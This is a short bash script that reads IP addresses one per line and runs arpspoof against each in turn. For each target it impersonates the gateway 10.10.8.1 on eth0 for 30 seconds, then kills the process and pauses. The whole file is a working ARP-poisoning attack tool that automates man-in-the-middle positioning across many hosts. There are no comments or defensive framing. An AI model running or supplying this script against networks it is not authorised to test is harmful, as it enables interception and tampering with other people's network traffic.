#!/bin/bash

SPOOF_TIME=30
CLEAR_TIME=10

while read target
do
  if echo "$target" | grep -qE '([0-9]+\.){3}[0-9]+'
  then  
    printf "spoofing $target..."
    xterm -e "arpspoof -i eth0 10.10.8.1 -t $target" 2>/dev/null 1>/dev/null &
    sleep $SPOOF_TIME
    echo "clear"
    pid=$(ps -ef | grep arpspoof | grep $target | grep -v grep | grep -v xterm | sed -r 's/\s+/ /g' | cut -f2 -d' ')
    kill -SIGINT $pid
    sleep $CLEAR_TIME
  fi
done